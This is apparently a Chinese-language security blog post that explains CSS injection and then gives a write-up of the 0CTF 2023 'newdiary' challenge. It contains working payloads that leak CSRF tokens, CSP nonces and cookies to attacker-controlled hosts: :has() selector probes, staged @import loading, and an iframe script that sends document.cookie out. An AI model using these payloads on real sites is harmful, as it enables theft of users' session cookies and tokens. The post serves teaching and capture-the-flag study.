---
title: 前端安全：CSS 注入
date: 2023-12-12 10:29:48
categories:
- CSS
tags:
- CSS
- 0ctf 2023
mermaid: true
image:
  path: /assets/images/css-injection.webp
toc: true
---
# 前端安全：CSS 注入
css 注入通常用于窃取页面敏感信息，例如 csrf-token，csp 中的 nonce 值等。通常配合 xss、csrf 漏洞一同使用。

## CSS 注入原理
下面的 payload 展示了一个窃取 csrf-token 的示例。

```bash
<!DOCTYPE html>

<head>
    <style>
        form:has(input[name="csrf-token"][value^="a"]){
            background: url("http://attacker/?q=a");
        }
    </style>
    <meta charset="UTF-8">
</head>

<body>
    <form action="/action">
        <input name="username">
        <input type="submit">
        <input type="hidden" name="csrf-token" value="abc123">
    </form>
</body>
</html>
```
在这个 payload 中，我们使用 has 选择器，从 form 表单中选择满足 name="csrf-token"，value 以 a 开头的 input 标签，如果能够获取到这样的标签，就通过 background 加载远程图片。

换句话来说，如果能够插入这样一行 css 代码，并且 csrf-token 确实以 a 开头，那么就能够受到一个请求。通过遍历就可以确认第一个字符。
```css
    form:has(input[name="csrf-token"][value^="a"]){
        background: url("http://attacker/?q=a");
    }

    form:has(input[name="csrf-token"][value^="b"]){
        background: url("http://attacker/?q=b");
    }
    
    form:has(input[name="csrf-token"][value^="c"]){
        background: url("http://attacker/?q=c");
    }
    ...
```
得到第一个字符后（假设为 a），就可以开始遍历第二个字符。
```css
    form:has(input[name="csrf-token"][value^="aa"]){
        background: url("http://attacker/?q=a");
    }

    form:has(input[name="csrf-token"][value^="ab"]){
        background: url("http://attacker/?q=b");
    }
    
    form:has(input[name="csrf-token"][value^="ac"]){
        background: url("http://attacker/?q=c");
    }
    ...
```
利用这样侧信道的方式，循环遍历就可以获取到所有的 csrf-token。

但其中存在一个问题，如果要一次将所有 payload 注入进去，大小写字母及数字加起来 62 个，如果要遍历每种组合的话 payload 将会非常长，特别是 token 长度一般也不会短。

如果分段注入呢？例如先注入猜解第一个字符的 payload，确认第一个字符之后，再注入猜解第二个字符的 payload。但这又会出现一个问题，页面需要进行刷新才能加载新的 payload，而刷新之后，csrf-token 往往会发生变化。

Pepe Vila 在 2019 提出了新的利用方式：@import，可以在不刷新页面的情况下，分阶段加载 css。

@import 可以进一步加载其他的 css。示例 payload 如下：
```css
@import url(https://myserver.com/start?len=8)
```
攻击者服务器可以回复下面的 payload，此时客户端会逐个请求。
```css
@import url(https://myserver.com/payload?len=1)
@import url(https://myserver.com/payload?len=2)
@import url(https://myserver.com/payload?len=3)
@import url(https://myserver.com/payload?len=4)
@import url(https://myserver.com/payload?len=5)
@import url(https://myserver.com/payload?len=6)
@import url(https://myserver.com/payload?len=7)
@import url(https://myserver.com/payload?len=8)
```
客户端请求 payload?len=1 时，攻击者可以回复枚举第一个字符的 payload。
```css
    form:has(input[name="csrf-token"][value^="a"]){
        background: url("http://attacker/?q=a");
    }

    form:has(input[name="csrf-token"][value^="b"]){
        background: url("http://attacker/?q=b");
    }
    
    form:has(input[name="csrf-token"][value^="c"]){
        background: url("http://attacker/?q=c");
    }
    ...
```
第一个字符确认后，再生成 payload?len=2 的响应内容，客户端此时请求该 url 时，攻击者就可以回复特定的 payload。
```css
    form:has(input[name="csrf-token"][value^="aa"]){
        background: url("http://attacker/?q=a");
    }

    form:has(input[name="csrf-token"][value^="ab"]){
        background: url("http://attacker/?q=b");
    }
    
    form:has(input[name="csrf-token"][value^="ac"]){
        background: url("http://attacker/?q=c");
    }
    ...
```
后面的过程依次类推。

这种方式也有一些需要注意的地方：
1. 浏览器对同一个域名发起的请求有上限。如果请求太多仍旧会被限制，但也可以通过设置多个子域名来绕过限制，比如 a.attacker.com，b.attacker.com。
2. firefox 下 payload 有所不同，原因在于 firefox 不会逐个 import css，而是一次性加载，这样就达不到分阶段确认字符的目的。 Michał Bentkowski 的文章提出了解决办法：[CSS data exfiltration in Firefox via a single injection point - research.securitum.com](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/) 

chrome 和 firefox 通用 payload：
```css
<style>@import url(https://myserver.com/payload?len=1)</style>
<style>@import url(https://myserver.com/payload?len=2)</style>
<style>@import url(https://myserver.com/payload?len=3)</style>
<style>@import url(https://myserver.com/payload?len=4)</style>
<style>@import url(https://myserver.com/payload?len=5)</style>
<style>@import url(https://myserver.com/payload?len=6)</style>
<style>@import url(https://myserver.com/payload?len=7)</style>
<style>@import url(https://myserver.com/payload?len=8)</style>
```

## 更快的枚举
文章 [Code Vulnerabilities Put Proton Mails at Risk - Sonar](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/) 展示了一种更快的枚举方式。

通过示例代码可以更好地理解：
```bash
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline'">
  </head>
  <style>
    :has(script[nonce*="aaa"]){--tosend-aaa: url(http://192.168.137.98:7777?x=aaa);}
    :has(script[nonce*="aab"]){--tosend-aab: url(http://192.168.137.98:7777?x=aab);}
    :has(script[nonce*="aac"]){--tosend-aac: url(http://192.168.137.98:7777?x=aac);}

    input{
        background: var(--tosend-aaa, none),
        var(--tosend-aab, none),
        var(--tosend-aac, none),
        var(--tosend-aad, none)
    }

  </style>
  <body>
    <input>
    <script nonce="nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1">
        console.log(1)
    </script>
  </body>
```
页面中的 CSP 设置了 nonce 值，只有 nonce 属性值与 CSP 中设置的值相同的 JS 内链脚本才能够被执行，这个机制通常用于 XSS 防护。攻击者需要窃取到该值才能够正常运行 XSS。

其中 css 注入 payload 如下。
```bash
    :has(script[nonce*="aaa"]){--tosend-aaa: url(http://192.168.137.98:7777?x=aaa);}

    input{
        background: var(--tosend-aaa, none),
        var(--tosend-aab, none),
        var(--tosend-aac, none),
        var(--tosend-aad, none)
    }
```
其作用就是在页面选择 nonce 值包含了 aaa 的 script 标签（`*=` 表示 nonce 值含有 aaa 时），如果能够选择到，则设定一个自定义属性 tosend-aaa（自定义属性以 -- 开头），通过这个属性向外发起请求。

定义 input 样式的作用在于调用自定义参数，从而触发向外的请求，换用其他标签也同样可以，例如 div。

由于 nonce 中存在 aaa，因此可以受到一个 aaa 的请求：

![20231212195241](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212195241.png)

如何获取完整的字符串呢？假设 none 值为 32 位随机字符串：
qhkkzvf5mc3iv090nyysyq6wc80ai4v1

我们可以通过上面的方式，每次获取 3 位的子串，获取到 30 个不重复的子串，通过回溯的方式即可恢复整个字符串。比如 f5m 的后两位为 5m, 5m 又是 5mc 的开头，那么就可以确认 f5m 后一个字符为 c。
```py
{'f5m', 'c3i', 'i4v', '3iv', 'zvf', 'iv0', 'syq', '0ai', '6wc', 'kkz', 'yq6', 'q6w', '5mc', 'c80', '4v1', 'ysy', '0ny', 'yys', 'ai4', '090', 'v09', 'nyy', 'mc3', 'hkk', 'qhk', 'vf5', 'kzv', 'wc8'}
```
这样一来，只需要较少的请求就可以获取完整的字符串。

## 0CTF 2023 newdiary
前几天的 0CTF 2023 newdiary 这道题就是考察的 CSS 注入的利用。

![20231212200326](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212200326.png)

题目设定了一个 XSS 的场景，用户可以发布内容并分享给后台 bot，bot 的 cookie 设定为 FLAG，因此我们需要通过 XSS 获取到 FLAG。

题目没有进行 XSS 的过滤，但设定了 CSP，即使能够插入 js 代码，由于无法确认 nonce 值，代码也无法执行。
```html
    <meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-qhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com">
```
但 CSP style-src 设置为 'unsafe-inline' https://unpkg.com"，允许内联执行，并信任来自 unpkg.com 的 css，所以这道题的思路就是利用 css 注入来窃取 nonce 值。

利用步骤如下：
1. 新建一个笔记 redirect，id 为 0，内容如下，该 payload 可以达成重定向的效果。在无法使用 js 时，可以通过 mata 来完成重定向，meta 标签通常不会被过滤。
   ```html
   <meta http-equiv="refresh" content="0.0;url=http://192.168.137.98:8888/index.html"> 
   ```
   其中 index.html 内容如下：
   ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
    </head>
    <body>
        
        <script>
            const sleep = (milliseconds) => new Promise(resolve => setTimeout(resolve, milliseconds));
            async function run(){
                bot_window = window.open("http://localhost/share/read#id=1&username={{USERNAME}}"); // Exploit 1, leak nonce
                await sleep(7000);

                bot_window.location.href = "http://localhost/share/read#id=2&username={{USERNAME}}"; // Exploit 2, leak cookie
                await sleep(100);
                console.log("O");
            }
            run();
        </script>
    </body>
    </html>
   ```
   其主要功能是让 bot 通过 window.open 打开新的标签，然后访问 id=1 的笔记。等待一段时间后，再重定向到 id=2 的笔记。

2. 新建一个笔记 steal，id 为 1,内容为窃取 nonce 值的 css 脚本。由于题目信任来自 unpkg.com 的 css 文件，我们可以先将泄露 nonce 值的 css 上传到 unpkg.com 中。
   ```html
   <link rel="stylesheet" href="http://unpkg.com/xxx/leak.css"><input />
   ```
3. 当 bot 访问 id=0 的笔记时，会被重定向到攻击者页面，打开新的标签页，访问 id=1 的笔记。接着加载 leak.css 泄流出 id=1 页面的 nonce 值。此时 bot 进入等待时间。
4. 枚举到 nonce 值后，新建一个笔记 flag，id 为 2，写入获取 cookie 值的 payload，nonce 值为刚才窃取到的值
   ```bash
    <iframe name=asd srcdoc="<script nonce=xxxx >top.location='http://attacker/flag?flag='+encodeURI(document['cookie'])</script>"/>
   ```
   因为页面设置了 script-src 为 nonce，禁止了 js 脚本的内联执行，因此这里使用 iframe 打开子窗口来加载 js 代码。
5. bot 结束等待时间，访问 id=2 的页面，执行 js 代码将 cookie 发送到远程。


这里需要注意的是，页面的重定向（刷新）通常会导致 nonce 值发生变化，但题目环境是通过 url 中的 hash 值（# 之后的部分）来更新页面内容的，nonce 值有一个特点，# 之后的部分改变时，nonce 值不会发生变化，这也是这道题的一个关键点。

题目 payload 可参考：[CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups](https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md)

使用时注意将 index.html 放在 tempalte 目录下。启动 server.py 后，访问 /exploit。

![20231212203249](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212203249.png)

# 参考
- [CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups](https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md)
- [Beyond XSS](https://aszx87410.github.io/beyond-xss/)
